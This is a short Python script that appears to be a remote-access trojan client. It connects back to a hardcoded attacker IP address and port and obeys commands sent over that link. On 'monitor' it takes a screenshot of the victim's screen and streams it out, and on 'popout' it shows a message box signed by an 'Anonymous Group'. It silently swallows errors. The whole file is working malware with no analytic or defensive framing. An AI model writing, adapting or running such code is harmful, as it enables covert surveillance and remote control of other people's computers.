
import socket
import time
import numpy as np
import pyautogui
import ctypes

try:
    # Define the attacker's IP and port to connect back to
    attacker_ip = "193.161.193.99"
    attacker_port = 61146

    # Create a socket object and connect to the attacker's system
    target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target.connect((attacker_ip, attacker_port))

    # Send and receive commands
    while True:
        command = target.recv(1024).decode()
        print(command.lower())
        if command.lower() == "exit":
            break
        elif command.lower() == "monitor":
            # Capture the screen as an image
            screenshot = pyautogui.screenshot()
            image = np.array(screenshot)

            # Get the shape of the image
            image_shape = image.shape

            # Serialize the shape as a string and send it
            shape_str = str(image_shape[0]) + ',' + str(image_shape[1]) + ',' + str(image_shape[2])
            data_to_send = shape_str.encode()
            target.send(data_to_send)
            time.sleep(1)
            # Convert the image to bytes and send it
            image_data = image.tobytes()
            target.send(str(len(image_data)).encode().ljust(16))
            target.send(image_data)
        elif command.lower() == "popout":
            message = target.recv(1024).decode()
            ctypes.windll.user32.MessageBoxW(0, message, "AboAlradya Anonymous Group", 0x30 | 0x1)        
        

            
    target.close()
except Exception as e:
    None
finally:
    None